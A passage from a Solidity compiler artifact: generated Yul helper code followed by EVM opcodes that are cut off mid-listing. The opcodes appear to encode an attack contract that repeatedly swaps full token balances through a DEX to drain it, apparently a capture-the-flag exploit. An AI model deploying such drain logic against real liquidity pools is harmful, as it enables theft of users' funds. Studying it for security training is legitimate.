									"contents": "{\n    { }\n    function abi_decode_tuple_t_address(headStart, dataEnd) -> value0\n    {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n        let value := calldataload(headStart)\n        if iszero(eq(value, and(value, sub(shl(160, 1), 1)))) { revert(0, 0) }\n        value0 := value\n    }\n    function abi_encode_tuple_t_address_t_address_t_rational_10_by_1__to_t_address_t_address_t_uint256__fromStack_reversed(headStart, value2, value1, value0) -> tail\n    {\n        tail := add(headStart, 96)\n        let _1 := sub(shl(160, 1), 1)\n        mstore(headStart, and(value0, _1))\n        mstore(add(headStart, 32), and(value1, _1))\n        mstore(add(headStart, 64), value2)\n    }\n    function abi_decode_tuple_t_bool_fromMemory(headStart, dataEnd) -> value0\n    {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n        let value := mload(headStart)\n        if iszero(eq(value, iszero(iszero(value)))) { revert(0, 0) }\n        value0 := value\n    }\n    function abi_encode_tuple_t_address_t_uint256__to_t_address_t_uint256__fromStack_reversed(headStart, value1, value0) -> tail\n    {\n        tail := add(headStart, 64)\n        mstore(headStart, and(value0, sub(shl(160, 1), 1)))\n        mstore(add(headStart, 32), value1)\n    }\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart, value0) -> tail\n    {\n        tail := add(headStart, 32)\n        mstore(headStart, and(value0, sub(shl(160, 1), 1)))\n    }\n    function abi_decode_tuple_t_uint256_fromMemory(headStart, dataEnd) -> value0\n    {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n        value0 := mload(headStart)\n    }\n    function abi_encode_tuple_t_address_t_address_t_uint256__to_t_address_t_address_t_uint256__fromStack_reversed(headStart, value2, value1, value0) -> tail\n    {\n        tail := add(headStart, 96)\n        let _1 := sub(shl(160, 1), 1)\n        mstore(headStart, and(value0, _1))\n        mstore(add(headStart, 32), and(value1, _1))\n        mstore(add(headStart, 64), value2)\n    }\n    function abi_encode_tuple_t_address_t_address_t_rational_45_by_1__to_t_address_t_address_t_uint256__fromStack_reversed(headStart, value2, value1, value0) -> tail\n    {\n        tail := add(headStart, 96)\n        let _1 := sub(shl(160, 1), 1)\n        mstore(headStart, and(value0, _1))\n        mstore(add(headStart, 32), and(value1, _1))\n        mstore(add(headStart, 64), value2)\n    }\n    function abi_encode_tuple_t_address_t_address_t_rational_90_by_1__to_t_address_t_address_t_uint256__fromStack_reversed(headStart, value2, value1, value0) -> tail\n    {\n        tail := add(headStart, 96)\n        let _1 := sub(shl(160, 1), 1)\n        mstore(headStart, and(value0, _1))\n        mstore(add(headStart, 32), and(value1, _1))\n        mstore(add(headStart, 64), value2)\n    }\n}",
									"id": 5,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x2216E590 EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x3E50269C EQ PUSH2 0x78 JUMPI DUP1 PUSH4 0xD7DF8D6F EQ PUSH2 0x80 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x76 PUSH2 0x54 CALLDATASIZE PUSH1 0x4 PUSH2 0xF67 JUMP JUMPDEST PUSH1 0x2 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP2 SWAP1 SWAP2 OR SWAP1 SSTORE JUMP JUMPDEST STOP JUMPDEST PUSH2 0x76 PUSH2 0x88 JUMP JUMPDEST PUSH2 0x76 PUSH2 0x931 JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x23B872DD PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x23B872DD SWAP1 PUSH2 0xBD SWAP1 CALLER SWAP1 ADDRESS SWAP1 PUSH1 0xA SWAP1 PUSH1 0x4 ADD PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xDC JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x100 SWAP2 SWAP1 PUSH2 0xFBB JUMP JUMPDEST POP PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x23B872DD PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x23B872DD SWAP1 PUSH2 0x136 SWAP1 CALLER SWAP1 ADDRESS SWAP1 PUSH1 0xA SWAP1 PUSH1 0x4 ADD PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x155 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x179 SWAP2 SWAP1 PUSH2 0xFBB JUMP JUMPDEST POP PUSH1 0x0 SLOAD PUSH1 0x3 SLOAD PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 NOT PUSH1 0x24 DUP3 ADD MSTORE SWAP2 AND SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1D0 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1F4 SWAP2 SWAP1 PUSH2 0xFBB JUMP JUMPDEST POP PUSH1 0x1 SLOAD PUSH1 0x3 SLOAD PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 NOT PUSH1 0x24 DUP3 ADD MSTORE SWAP2 AND SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x24B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x26F SWAP2 SWAP1 PUSH2 0xFBB JUMP JUMPDEST POP PUSH1 0x3 SLOAD PUSH1 0x0 SLOAD PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP4 PUSH4 0xDF791E50 SWAP4 DUP2 AND SWAP3 AND SWAP1 DUP3 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x2CB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x2EF SWAP2 SWAP1 PUSH2 0xFDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x30D SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x327 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x33B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x3 SLOAD PUSH1 0x1 SLOAD PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP6 POP PUSH4 0xDF791E50 SWAP5 POP SWAP2 DUP4 AND SWAP3 AND SWAP1 DUP3 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x39B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x3BF SWAP2 SWAP1 PUSH2 0xFDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x3DD SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x3F7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x40B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x3 SLOAD PUSH1 0x0 SLOAD PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP6 POP PUSH4 0xDF791E50 SWAP5 POP SWAP2 DUP4 AND SWAP3 AND SWAP1 DUP3 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x46B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x48F SWAP2 SWAP1 PUSH2 0xFDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x4AD SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x4C7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x4DB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x3 SLOAD PUSH1 0x1 SLOAD PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP6 POP PUSH4 0xDF791E50 SWAP5 POP SWAP2 DUP4 AND SWAP3 AND SWAP1 DUP3 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x53B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x55F SWAP2 SWAP1 PUSH2 0xFDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x57D SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x597 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x5AB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x3 SLOAD PUSH1 0x0 SLOAD PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP6 POP PUSH4 0xDF791E50 SWAP5 POP SWAP2 DUP4 AND SWAP3 AND SWAP1 DUP3 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x60B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x62F SWAP2 SWAP1 PUSH2 0xFDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x64D SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x667 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x67B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x3 SLOAD PUSH1 0x1 SLOAD PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0xDF791E5 PUSH1 0xE4 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP6 POP PUSH4 0xDF791E50 SWAP5 POP PUSH2 0x6BE SWAP4 SWAP3 DUP4 AND SWAP3 SWAP1 SWAP2 AND SWAP1 PUSH1 0x2D SWAP1 PUSH1 0x4 ADD PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x6D8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x6EC JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x2 SLOAD PUSH1 0x3 SLOAD PUSH1 0x40 MLOAD PUSH4 0x23B872DD PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 DUP4 AND SWAP5 POP PUSH4 0x23B872DD SWAP4 POP PUSH2 0x728 SWAP3 CALLER SWAP3 AND SWAP1 PUSH1 0x5A SWAP1 PUSH1 0x4 ADD PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x747 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x76B SWAP2 SWAP1 PUSH2 0xFBB JUMP JUMPDEST POP PUSH1 0x2 SLOAD PUSH1 0x40 MLOAD PUSH4 0x23B872DD PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x23B872DD SWAP1 PUSH2 0x7A1 SWAP1 CALLER SWAP1 ADDRESS SWAP1 PUSH1 0x5A SWAP1 PUSH1 0x4 ADD PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x7C0 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x7E4 SWAP2 SWAP1 PUSH2 0xFBB JUMP JUMPDEST POP PUSH1 0x2 SLOAD PUSH1 0x3 SLOAD PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 NOT PUSH1 0x24 DUP3 ADD MSTORE SWAP2 AND SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x83B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x85F SWAP2 SWAP1 PUSH2 0xFBB JUMP JUMPDEST POP PUSH1 0x3 SLOAD PUSH1 0x2 SLOAD PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP4 PUSH4 0xDF791E50 SWAP4 DUP2 AND SWAP3 AND SWAP1 DUP3 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x8BB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x8DF SWAP2 SWAP1 PUSH2 0xFDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x8FD SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x917 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x92B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x23B872DD PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x23B872DD SWAP1 PUSH2 0x966 SWAP1 CALLER SWAP1 ADDRESS SWAP1 PUSH1 0xA SWAP1 PUSH1 0x4 ADD PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x985 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x9A9 SWAP2 SWAP1 PUSH2 0xFBB JUMP JUMPDEST POP PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x23B872DD PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x23B872DD SWAP1 PUSH2 0x9DF SWAP1 CALLER SWAP1 ADDRESS SWAP1 PUSH1 0xA SWAP1 PUSH1 0x4 ADD PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x9FE JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xA22 SWAP2 SWAP1 PUSH2 0xFBB JUMP JUMPDEST POP PUSH1 0x0 SLOAD PUSH1 0x3 SLOAD PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 NOT PUSH1 0x24 DUP3 ADD MSTORE SWAP2 AND SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xA79 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xA9D SWAP2 SWAP1 PUSH2 0xFBB JUMP JUMPDEST POP PUSH1 0x1 SLOAD PUSH1 0x3 SLOAD PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 NOT PUSH1 0x24 DUP3 ADD MSTORE SWAP2 AND SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xAF4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xB18 SWAP2 SWAP1 PUSH2 0xFBB JUMP JUMPDEST POP PUSH1 0x3 SLOAD PUSH1 0x0 SLOAD PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP4 PUSH4 0xDF791E50 SWAP4 DUP2 AND SWAP3 AND SWAP1 DUP3 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xB74 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xB98 SWAP2 SWAP1 PUSH2 0xFDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 